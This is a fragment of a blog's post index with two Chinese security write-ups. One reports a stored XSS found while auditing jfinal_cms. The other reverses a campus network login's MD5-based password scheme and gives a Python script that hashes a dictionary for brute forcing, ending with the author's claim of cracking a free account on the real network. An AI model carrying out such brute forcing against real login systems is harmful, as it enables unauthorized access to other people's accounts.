class_">SimpleAuthenticationInfo</span>(<span class="string">&quot;&quot;</span>, user.getPassword(), <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Java开发</tag>
      </tags>
  </entry>
  <entry>
    <title>半途而废的jfinal_cms审计</title>
    <url>/2024/12/09/%E5%8D%8A%E9%80%94%E8%80%8C%E5%BA%9F%E7%9A%84jfinal-cms%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记一次失败的代码审计，还有好多洞审出来没有记录，因为审出来打开GitHub issue界面发现大家都提交过了，只是项目年久失修没有人维护没人修，遂直接放弃，展示一下前十分钟的xss成果…后面的sql注入，rce什么的不想写了</p>
<p>仓库链接：<a class="link" href="https://github.com/jflyfox/jfinal_cms">https://github.com/jflyfox/jfinal_cms<i class="fas fa-external-link-alt"></i></a></p>
<p>审计版本：5.1.0最新版，一堆洞</p>
<h1 id="软件包分析"><a href="#软件包分析" class="headerlink" title="软件包分析"></a>软件包分析</h1><p>这个包结构，遵循MVC三层架构</p>
<p><img src="/2024/12/09/%E5%8D%8A%E9%80%94%E8%80%8C%E5%BA%9F%E7%9A%84jfinal-cms%E5%AE%A1%E8%AE%A1/image-20241208095932971.png" alt="image-20241208095932971"></p>
<p>项目中只有使用了MySql的驱动，好像是它使用的web框架封装了jdbc操作，查看文档后验证了这是一个WEB+ORM框架</p>
<p><img src="/2024/12/09/%E5%8D%8A%E9%80%94%E8%80%8C%E5%BA%9F%E7%9A%84jfinal-cms%E5%AE%A1%E8%AE%A1/image-20241208111730420.png" alt="image-20241208111730420"></p>
<p><img src="/2024/12/09/%E5%8D%8A%E9%80%94%E8%80%8C%E5%BA%9F%E7%9A%84jfinal-cms%E5%AE%A1%E8%AE%A1/image-20241208100405820.png" alt="image-20241208100405820"></p>
<h1 id="后台XSS"><a href="#后台XSS" class="headerlink" title="后台XSS"></a>后台XSS</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">com/jflyfox/modules/admin/person/PersonController.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">json</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    json.put(<span class="string">&quot;status&quot;</span>, <span class="number">2</span>);<span class="comment">// 失败</span></span><br><span class="line"></span><br><span class="line">    <span class="type">SysUser</span> <span class="variable">user</span> <span class="operator">=</span> (SysUser) getSessionUser();</span><br><span class="line">    <span class="type">int</span> <span class="variable">userid</span> <span class="operator">=</span> user.getInt(<span class="string">&quot;userid&quot;</span>);</span><br><span class="line">    <span class="type">SysUser</span> <span class="variable">model</span> <span class="operator">=</span> getModel(SysUser.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (userid != model.getInt(<span class="string">&quot;userid&quot;</span>)) &#123;</span><br><span class="line">        json.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;提交数据错误！&quot;</span>);</span><br><span class="line">        renderJson(json.toJSONString());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第三方用户不需要密码</span></span><br><span class="line">    <span class="keyword">if</span> (user.getInt(<span class="string">&quot;usertype&quot;</span>) != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">oldPassword</span> <span class="operator">=</span> getPara(<span class="string">&quot;old_password&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">newPassword</span> <span class="operator">=</span> getPara(<span class="string">&quot;new_password&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">newPassword2</span> <span class="operator">=</span> getPara(<span class="string">&quot;new_password2&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!user.getStr(<span class="string">&quot;password&quot;</span>).equals(JFlyFoxUtils.passwordEncrypt(oldPassword))) &#123;</span><br><span class="line">            json.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;密码错误！&quot;</span>);</span><br><span class="line">            renderJson(json.toJSONString());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (StrUtils.isNotEmpty(newPassword) &amp;&amp; !newPassword.equals(newPassword2)) &#123;</span><br><span class="line">            json.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;两次新密码不一致！&quot;</span>);</span><br><span class="line">            renderJson(json.toJSONString());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (StrUtils.isNotEmpty(newPassword)) &#123; <span class="comment">// 输入密码并且一直</span></span><br><span class="line">            model.set(<span class="string">&quot;password&quot;</span>, JFlyFoxUtils.passwordEncrypt(newPassword));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (StrUtils.isNotEmpty(model.getStr(<span class="string">&quot;email&quot;</span>)) &amp;&amp; model.getStr(<span class="string">&quot;email&quot;</span>).indexOf(<span class="string">&quot;@&quot;</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        json.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;email格式错误！&quot;</span>);</span><br><span class="line">        renderJson(json.toJSONString());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    <span class="comment">// 日志添加</span></span><br><span class="line">model.put(<span class="string">&quot;update_id&quot;</span>, getSessionUser().getUserid());</span><br><span class="line">model.put(<span class="string">&quot;update_time&quot;</span>, getNow());</span><br><span class="line"></span><br><span class="line">model.update();</span><br><span class="line">UserCache.init(); <span class="comment">// 设置缓存</span></span><br><span class="line"><span class="type">SysUser</span> <span class="variable">newUser</span> <span class="operator">=</span> SysUser.dao.findById(userid);</span><br><span class="line">setSessionUser(newUser); <span class="comment">// 设置session</span></span><br><span class="line">json.put(<span class="string">&quot;status&quot;</span>, <span class="number">1</span>);<span class="comment">// 成功</span></span><br><span class="line"></span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到没有对输入的数据做任何内容校验，仅仅做了越权校验以及对邮箱号格式校验，且仅检测内容中是否包含@，然后把所有数据写入到数据库，</p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p><img src="/2024/12/09/%E5%8D%8A%E9%80%94%E8%80%8C%E5%BA%9F%E7%9A%84jfinal-cms%E5%AE%A1%E8%AE%A1/image-20241208104932863.png" alt="image-20241208104932863"></p>
<p>保存后</p>
<p><img src="/2024/12/09/%E5%8D%8A%E9%80%94%E8%80%8C%E5%BA%9F%E7%9A%84jfinal-cms%E5%AE%A1%E8%AE%A1/image-20241208105001981.png" alt="image-20241208105001981"></p>
<p>可以看到数据流侵入到了控制流，成功写入数据库，造成了XSS漏洞</p>
<p><img src="/2024/12/09/%E5%8D%8A%E9%80%94%E8%80%8C%E5%BA%9F%E7%9A%84jfinal-cms%E5%AE%A1%E8%AE%A1/image-20241208105037984.png" alt="image-20241208105037984"></p>
<p><img src="/2024/12/09/%E5%8D%8A%E9%80%94%E8%80%8C%E5%BA%9F%E7%9A%84jfinal-cms%E5%AE%A1%E8%AE%A1/image-20241208105159685.png" alt="image-20241208105159685"></p>
]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>校园网登录框前端加密分析</title>
    <url>/2024/12/23/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E5%BD%95%E6%A1%86%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>尝试对学校校园网登录框进行爆破，发现密码在前端被加密了</p>
<p><img src="/2024/12/23/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E5%BD%95%E6%A1%86%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/image-20241105222140773.png" alt="test"></p>
<h2 id="Burp抓包"><a href="#Burp抓包" class="headerlink" title="Burp抓包"></a>Burp抓包</h2><p><img src="/2024/12/23/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E5%BD%95%E6%A1%86%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/image-20241105222239417.png" alt="image-20241105222239417"></p>
<p>抓包信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DDDDD=2022***&amp;upass=3d5c84b6fb1dc75987884f39c05b0e6a123456782&amp;R1=0&amp;R2=1&amp;para=00&amp;0MKKey=123456&amp;v6ip=</span><br></pre></td></tr></table></figure>

<p>From表单提交上来的文本这些参数，DDDD是用户名，upass是密码，后面的参数意义不明，看样子是MD5加密，尝试输入admin，然后拿到md5解密网站去解密一波看看</p>
<p><img src="/2024/12/23/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E5%BD%95%E6%A1%86%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/image-20241105223037070.png" alt="image-20241105223037070"></p>
<p>根本查不到，所以不是普通的MD5加密，遂开始Js逆向</p>
<h2 id="Js逆向"><a href="#Js逆向" class="headerlink" title="Js逆向"></a>Js逆向</h2><p>点击登录按钮，查看堆栈信息，总共调用了两个JS文件</p>
<p><img src="/2024/12/23/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E5%BD%95%E6%A1%86%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/image-20241105223344308.png" alt="image-20241105223344308"></p>
<p>全局搜索Password，定位到这里，但显然这个password并不是用于加密的相关函数，但找了找其他关键字，也没有，索性在这里下一个断点，程序执行到这里时会卡住，</p>
<p><img src="/2024/12/23/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E5%BD%95%E6%A1%86%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/image-20241105224303608.png" alt="image-20241105224303608"></p>
<p>这时点击继续执行代码，点击返回之后，调用堆栈信息多出了一个JS文件a41.js</p>
<p><img src="/2024/12/23/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E5%BD%95%E6%A1%86%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/image-20241105224546578.png" alt="image-20241105224546578"></p>
<p>我们点击跟进，在a41.js中发现function ee()函数，此处下一个断点，这里下断点的原因程序执行完之后会把内存里的变量信息全部丢掉，所以我们要赶在程序没执行完之前去看看变量里面都有些啥，果不其然，定位到了我们输入的源数据，现在已经成功确定了加密算法函数在a41.js中</p>
<p><img src="/2024/12/23/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E5%BD%95%E6%A1%86%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/image-20241105224914871.png" alt="image-20241105224914871"></p>
<p>现在我们把这个a41.js下载下来分析</p>
<p><img src="/2024/12/23/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E5%BD%95%E6%A1%86%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/image-20241105225134864.png" alt="image-20241105225134864"></p>
<p>这段JavaScript代码包含了多个函数，主要用于处理登录逻辑、MD5加密、Base64编码，以及Cookie的设置、获取和删除。</p>
<ul>
<li><code>ee()</code>: 这个函数处理登录时的逻辑。它首先检查用户名和密码是否已输入，然后根据<code>ps</code>变量的值决定密码是否需要进行MD5加密或Base64编码，最后提交表单。同时，它处理与Cookie相关的逻辑，如保存登录信息。</li>
</ul>
<p>但是在Js文件的最顶上发现ps是一个常量，所以说代码永远只会进入到else分支<img src="/2024/12/23/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E5%BD%95%E6%A1%86%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/image-20241105225326077.png" alt="image-20241105225326077"></p>
<p>这个分支就是加密的整个逻辑了，pid和cala均为常量，所以<strong>tmpchar</strong>就等于</p>
<p>2+用户输入+12345678，最终在将tmpchar的值md5加密，然后加上123456782</p>
<p>最后得出结论，</p>
<p>C&#x3D;密文，M等于明文</p>
<p><strong>C &#x3D; MD5(2+M+12345678) + 12345678+2</strong></p>
<h2 id="构建Python脚本"><a href="#构建Python脚本" class="headerlink" title="构建Python脚本"></a>构建Python脚本</h2><p>知道加密算法之后，就可以批量加密密码来进行爆破了，虽然市面上有Burp的插件（<a class="link" href="https://github.com/c0ny1/jsEncrypter%EF%BC%89">https://github.com/c0ny1/jsEncrypter）<i class="fas fa-external-link-alt"></i></a></p>
<p>能直接调用JS来返回密文的，但是一点不想写JS文件，遂写了一个Python脚本用来批量加密字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(input_str.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">source_data</span>):</span><br><span class="line">    a = <span class="string">&quot;2&quot;</span></span><br><span class="line">    b = <span class="string">&quot;12345678&quot;</span></span><br><span class="line">    c = md5(a + source_data + b)</span><br><span class="line">    payload = c + <span class="string">&quot;123456782&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_data_from_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">return</span> file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_encrypted_data_to_file</span>(<span class="params">encrypted_data, file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> encrypted <span class="keyword">in</span> encrypted_data:</span><br><span class="line">            file.write(<span class="string">f&quot;<span class="subst">&#123;encrypted&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_original_and_encrypted_data</span>(<span class="params">data_pairs, file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> original, encrypted <span class="keyword">in</span> data_pairs:</span><br><span class="line">            file.write(<span class="string">f&quot;<span class="subst">&#123;original.strip()&#125;</span> : <span class="subst">&#123;encrypted&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_data</span>(<span class="params">input_file, encrypted_file, original_and_encrypted_file</span>):</span><br><span class="line">    data_pairs = []</span><br><span class="line">    encrypted_data = []</span><br><span class="line">    data_lines = read_data_from_file(input_file)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> data_lines:</span><br><span class="line">        encrypted = generate_payload(line.strip())</span><br><span class="line">        data_pairs.append((line.strip(), encrypted))</span><br><span class="line">        encrypted_data.append(encrypted)</span><br><span class="line">    save_encrypted_data_to_file(encrypted_data, encrypted_file)</span><br><span class="line">    save_original_and_encrypted_data(data_pairs, original_and_encrypted_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example usage</span></span><br><span class="line">input_file = <span class="string">&#x27;dic.txt&#x27;</span></span><br><span class="line">encrypted_file = <span class="string">&#x27;encrypted_data.txt&#x27;</span></span><br><span class="line">original_and_encrypted_file = <span class="string">&#x27;original_and_encrypted_data.txt&#x27;</span></span><br><span class="line">process_data(input_file, encrypted_file, original_and_encrypted_file)</span><br></pre></td></tr></table></figure>

<p>最后运行效果：</p>
<p><img src="/2024/12/23/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E5%BD%95%E6%A1%86%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/image-20241105230720525.png" alt="image-20241105230720525"></p>
<p>至此Js的逆向就告一段落,把Python脚本加密过的payload，成功爆破出免费账户</p>
<p><img src="/2024/12/23/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E5%BD%95%E6%A1%86%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/image-20241113135838112.png" alt="image-20241113135838112"></p>
]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
</search>
